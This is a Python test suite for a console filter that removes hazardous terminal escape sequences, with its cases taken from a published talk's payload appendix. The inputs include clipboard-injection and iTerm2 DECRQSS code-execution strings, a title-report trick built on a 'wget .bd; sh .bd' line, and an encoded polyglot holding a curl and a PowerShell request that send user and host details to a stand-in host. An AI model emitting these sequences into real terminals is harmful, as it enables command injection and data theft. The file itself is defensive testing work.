#!/usr/bin/env python3
"""Tests for scripts/console-filter.py: python3 -I tests/console-filter-test.py"""
import importlib.util
import os
import random
import sys

sys.dont_write_bytecode = True
here = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location("cf", os.path.join(here, "..", "scripts", "console-filter.py"))
cf = importlib.util.module_from_spec(spec)
spec.loader.exec_module(cf)

E, ST = "\x1b", "\x1b\\"
CASES = [
    # (input, expected output)
    ("hello\r\n\tok\x07\b", "hello\r\n\tok\x07\b"),
    ("a\x00b\x0ec\x7fd\x9be\x1af", "abcdef"),
    (f"{E}[1;38;2;10;20;30mX{E}[0m", f"{E}[1;38;2;10;20;30mX{E}[0m"),
    (f"{E}[?1049h{E}[?2026h{E}[2J{E}[H{E}[>1u{E}[?u{E}[c{E}[6n", f"{E}[?1049h{E}[?2026h{E}[2J{E}[H{E}[>1u{E}[?u{E}[c{E}[6n"),
    (f"{E}7{E}8{E}={E}(0{E}(B", f"{E}7{E}8{E}={E}(0{E}(B"),
    # clipboard: write and read, BEL and ST terminated, and the 8-bit OSC form
    (f"a{E}]52;c;ZWNobyBwd25lZAo=\x07b", "ab"),
    (f"a{E}]52;c;?{ST}b", "ab"),
    ("a\x9d52;c;Zm9v\x9cb", "a52;c;Zm9vb"),   # 8-bit OSC/ST dropped; payload is just text
    # other OSCs dropped; titles kept with controls stripped; colour queries kept, sets dropped
    (f"{E}]8;;https://evil/{ST}link{E}]8;;{ST}", "link"),
    (f"{E}]2;my‮title{ST}", f"{E}]2;mytitle{ST}"),
    (f"{E}]0;t\x07", f"{E}]0;t{ST}"),
    (f"{E}]11;?\x07{E}]11;rgb:0/0/0\x07", f"{E}]11;?{ST}"),
    (f"{E}]1337;File=x\x07{E}]777;notify;a;b\x07", ""),
    # DCS / APC / PM / SOS dropped
    (f"a{E}P$qm{ST}b{E}_Gf=100;AAAA{ST}c{E}^pm{ST}d", "abcd"),
    # window ops: title reports, moves, resizes and title push/pop dropped; size reports kept
    (f"{E}[21t{E}[20t{E}[3;0;0t{E}[8;999;999t{E}[18t{E}[22;0t{E}[23;0t{E}[>2t", f"{E}[18t"),
    # private modes: VT52 (?2) and 132 columns (?3) dropped in any position; other modes kept
    (f"{E}[?2l{E}[?3h{E}[?1;3l{E}[?2;25h{E}[?1h{E}[?25l{E}[?1049h{E}[4h{E}[2h", f"{E}[?1h{E}[?25l{E}[?1049h{E}[4h{E}[2h"),
    (f"{E}[5i{E}[?4i", ""),
    # an OSC cut short by another ESC is dropped, and the new sequence is parsed
    (f"{E}]2;x{E}]52;c;Zm9v\x07ok", "ok"),
    # CAN inside a CSI: sequence dropped
    (f"{E}[3\x182J", "2J"),
    # bidi/format controls stripped from text, ZWJ kept
    ("a‮b⁦c​d﻿‍", "abcd‍"),
]

# The payload list from Fredrik "STÖK" Alexandersson, "Weaponizing Plain Text: ANSI Escape Sequences as a
# Forensic Nightmare" (DEF CON 31 / Black Hat USA 2023), appendix PDF at i.blackhat.com, decoded from its
# printf/URL/JSON encodings to the bytes the terminal would see. Colour and cursor sequences pass: the filter
# keeps what the TUI draws with (README: the guest can still paint the screen). Everything that reaches past
# the screen, or makes the terminal wait or do unbounded work, must come out as plain text or nothing.
POLYGLOT_B64 = (   # OSC 52 payload that is an SVG-with-script data: URL, a curl and a PowerShell line at once
    "CgoKCgpkYXRhOmltYWdlL3N2Zyt4bWw7YmFzZTY0LFBITjJaeUIyWlhKemFXOXVQU0l4TGpFaUlHSmhjMlZRY205bWFXeGxQU0ptZFd4c0lpQjRiV3h1"
    "Y3owaWFIUjBjRG92TDNkM2R5NTNNeTV2Y21jdk1qQXdNQzl6ZG1jaVBnb2dJRHh6WTNKcGNIUWdkSGx3WlQwaWRHVjRkQzlxWVhaaGMyTnlhWEIwSWo0"
    "S0lDQWdJR0ZzWlhKMEtDSnBibXBsWTNScGIyNGdjM1ZqWTJWemMyWjFiQ0lwT3dvZ0lEd3ZjMk55YVhCMFBnbzhMM04yWno0PSMKCmN1cmwgImh0dHA6"
    "Ly8kKHdob2FtaSkuJChob3N0bmFtZSkucmNlcG9jLjEyNy4wLjAuMS5uaXAuaW8vJChwd2QgfCBiYXNlNjQpIgoKY21kIC9jIHBvd2Vyc2hlbGwgLUNv"
    "bW1hbmQgIiRVUkkgPSAnaHR0cDovLyV1c2VybmFtZSUuJWNvbXB1dGVybmFtZSUucmNlcG9jLjEyNy4wLjAuMS5uaXAuaW8vJztJbnZva2UtV2ViUmVx"
    "dWVzdCAtVXJpICRVUkkiCg=="
)
assert len("52;c;" + POLYGLOT_B64) > cf.MAX_OSC   # so this one takes the over-long OSC path
APPENDIX = [
    # basics: SGR colour and BEL pass unchanged; a bare ESC left at the end of the stream is held, not emitted
    (f"Hello {E}[32mTHIS IS GREEN{E}[0m\x07", f"Hello {E}[32mTHIS IS GREEN{E}[0m\x07"),
    (f"{E}[31mESC-INJECTION:{E}[32mSUCCESSFUL{E}[0m{E}", f"{E}[31mESC-INJECTION:{E}[32mSUCCESSFUL{E}[0m"),
    # the JSON-unicode / URL-encoded log-injection probes decode to the same colour sequences: they pass
    (f"somevalue\n{E}[31mESC-INJECTION-LFUNICODE:{E}[32mSUCCESSFUL{E}[0m\x07\n",
     f"somevalue\n{E}[31mESC-INJECTION-LFUNICODE:{E}[32mSUCCESSFUL{E}[0m\x07\n"),
    # H D Moore 2003: set the title to a command, ask the terminal to type it back (CSI 21 t), hide the echo.
    # The title sets pass (and are popped at RESET); the report, the step that types, is dropped.
    (f"{E}]2;;wget 127.0.0.1/.bd;sh .bd;exit;\x07{E}[21t{E}]2;xterm\x07Press Enter>{E}[8m",
     f"{E}]2;;wget 127.0.0.1/.bd;sh .bd;exit;{ST}{E}]2;xterm{ST}Press Enter>{E}[8m"),
    # ush.it 2010 httpd log injection: an empty title, then the request's CR/LFs
    (f"GET /{E}]2;\x07\n\r\n\r", f"GET /{E}]2;{ST}\n\r\n\r"),
    # OSC 8 hyperlinks: http, a bare BEL-terminated one, and the file: URI pointing at cmd.exe
    (f"{E}]8;;http://example.com{ST}This is a link{E}]8;;{ST}", "This is a link"),
    (f"{E}]8;;http://evil.terminalinjection.com\x07", ""),
    (f"An error has occured. Visit {E}]8;;file://c:\\Windows\\System32\\cmd.exe{ST}https://learn.microsoft.com/KB123YOLO{E}]8;;{ST} To learn more",
     "An error has occured. Visit https://learn.microsoft.com/KB123YOLO To learn more"),
    # OSC 52 clipboard: "open -a calculator.app", "sleep 1; echo Hello $(whoami)", and the polyglot (over MAX_OSC)
    (f"{E}]52;c;b3BlbiAtYSBjYWxjdWxhdG9yLmFwcAoK\x07", ""),
    (f"{E}]52;c;c2xlZXAgMQplY2hvIEhlbGxvICQod2hvYW1pKQoK\x07", ""),
    (f"{E}]52;c;{POLYGLOT_B64}\x07ok", "ok"),
    # hide your tracks: cursor home and erase screen pass (the TUI needs them); iTerm2 ClearScrollback does not
    (f"{E}[H\x07{E}]1337;ClearScrollback\x07{E}[2J\x07", f"{E}[H\x07{E}[2J\x07"),
    # print: CSI 0 i (print screen) and CSI 5 i (redirect output to the printer)
    (f"{E}[0i\x07{E}[5i\x07", "\x07\x07"),
    # hijack the mouse: every mode passes except 1001 (hilite tracking hangs xterm without a cooperating program)
    (f"{E}[?1001h{E}[?1002h{E}[?1003h{E}[?1004h{E}[?1005h{E}[?1006h{E}[?1007h{E}[?1015h{E}[?10016h",
     f"{E}[?1002h{E}[?1003h{E}[?1004h{E}[?1005h{E}[?1006h{E}[?1007h{E}[?1015h"),
    (f"{E}[?1001l{E}[?1;1001h", ""),
    # REP: ten repeats pass; a billion (the "bricked" slide, plain and URL-encoded with U+FE0F) is dropped
    (f"\u270c{E}[10;b\x07", f"\u270c{E}[10;b\x07"),
    (f"\u270c{E}[1000000000;b\x07", "\u270c\x07"),
    (f"\u270c\ufe0f{E}[1000000000;b\x07", "\u270c\ufe0f\x07"),
    (f"{E}[99999;1H{E}[999999;1H{E}[38;2;255;255;255m", f"{E}[99999;1H{E}[38;2;255;255;255m"),
    # iTerm2 DECRQSS RCE (CVE-2022-45872, David Leadbeater): the three DCS strings, alone and as the one request
    (f"{E}P$qm\x03{ST}{E}P$qm;open -a calculator;\r\n{ST}{E}P$qm{ST}", ""),
    (f"sup\n{E}[31mESC-INJECTION-SUCCESSFUL-LETS-POP-CALC{E}[0m\x07\n{E}P$qm\x03{ST}{E}P$qm;open -a calculator;\r{ST}{E}P$qm{ST}",
     f"sup\n{E}[31mESC-INJECTION-SUCCESSFUL-LETS-POP-CALC{E}[0m\x07\n"),
    # a DCS "terminated" by BEL is not terminated: like a terminal, the filter swallows text up to the next ESC
    (f"{E}P$qm\x03\x07X{E}[0m", f"{E}[0m"),
    # kitty OSC 5113 file transfer: terminated, with a newline-injected id, and the slide's unterminated form
    (f"{E}]5113;ac=send;id=test;n=aGVsbG8udHh0;sz=3;d=AQID{ST}", ""),
    (f"{E}]5113;ac=send;id=\nopen -a calculator.app\n{ST}", ""),
    (f"{E}]5113;ac=send;id=test;n=aGVsbG8udHh0;sz=3;d=AQID\\\\\n{E}[32mok", f"{E}[32mok"),
]
CASES += APPENDIX


def run(chunks):
    f = cf.Filter()
    return "".join(f.feed(c) for c in chunks)


failed = 0
for inp, want in CASES:
    got = run([inp])
    # Any split of the input across reads must give the same output.
    splits = [[inp[:k], inp[k:]] for k in range(len(inp) + 1)] + [list(inp)]
    bad = [s for s in splits if run(s) != got]
    if got != want or bad:
        failed += 1
        print(f"FAIL {inp!r}\n  want {want!r}\n  got  {got!r}" + (f"\n  split-dependent: {bad[0]!r}" if bad else ""))

# Fuzz: whatever the guest sends, the output must contain no OSC other than titles and colour
# queries, no string controls, and no bytes the filter is meant to drop.
rng = random.Random(1)
alphabet = ["\x1b", "[", "]", "P", "_", "\\", "\x07", "\x9c", "\x9b", "\x9d", ";", "5", "2", "c", "?", "t",
            "i", "m", "2", "1", "0", "\x18", "\x00", "a", " ", "(", "‮"]
for _ in range(20000):
    s = "".join(rng.choice(alphabet) for _ in range(rng.randint(1, 40)))
    out = run([s])
    j = 0
    while True:
        j = out.find("\x1b", j)
        if j < 0:
            break
        nxt = out[j + 1:j + 2]
        if nxt in ("P", "_", "^", "X") or (nxt == "]" and not (out.startswith("\x1b]0;", j) or out.startswith("\x1b]1;", j) or out.startswith("\x1b]2;", j) or out.startswith("\x1b]1", j) and out[j+2:j+5] in ("0;?", "1;?", "2;?"))):
            failed += 1
            print(f"FAIL fuzz {s!r} -> {out!r}")
            break
        if nxt == "[" and (out[j:].startswith("\x1b[21t") or out[j:].startswith("\x1b[20t")):
            failed += 1
            print(f"FAIL fuzz title report {s!r} -> {out!r}")
            break
        j += 1
    if any(ch in out for ch in "\x00\x18\x9b\x9c\x9d‮"):
        failed += 1
        print(f"FAIL fuzz control {s!r} -> {out!r}")

# START/RESET bracket the session: title pushed, then popped; the soft reset and scroll region reset are
# in RESET, and nothing in RESET is a sequence the filter itself would drop.
if cf.START != f"{E}[22;0t" or not cf.RESET.endswith(f"{E}[23;0t") or f"{E}[!p" not in cf.RESET or f"{E}[r" not in cf.RESET:
    failed += 1
    print("FAIL START/RESET title push/pop or soft reset missing")
for seq in (f"{E}[>4;0m", f"{E}[20l", f"{E}[?1l", f"{E}>", f"{E}[?1049l", f"{E}[?25h", f"{E}[?1001l", f"{E}[?1007l"):
    if seq not in cf.RESET:
        failed += 1
        print(f"FAIL RESET lacks {seq!r}")

# ESC % @ (leave UTF-8 mode) is dropped, so "ŝ" (C5 9D) can never be read as an 8-bit OSC.
for seq in (f"{E}%@", f"{E}%G", f"{E}%/G"):
    out = cf.Filter().feed(f"{seq}ŝ52;c;QUJD\x07")
    if "%" in out:
        failed += 1
        print(f"FAIL charset switch {seq!r} -> {out!r}")
if f"{E}%G" not in cf.RESET:
    failed += 1
    print("FAIL RESET lacks UTF-8 mode")

# Private modes are an allowlist: unknown ones (9001, 10016) are dropped whole, even beside an allowed one.
for seq, want in ((f"{E}[?9001h", ""), (f"{E}[?10016h", ""), (f"{E}[?25;9001l", ""), (f"{E}[?1049;25h", f"{E}[?1049;25h")):
    got = cf.Filter().feed(seq)
    if got != want:
        failed += 1
        print(f"FAIL mode allowlist {seq!r} -> {got!r}")

print("console-filter: ok" if not failed else f"console-filter: {failed} failed")
sys.exit(1 if failed else 0)
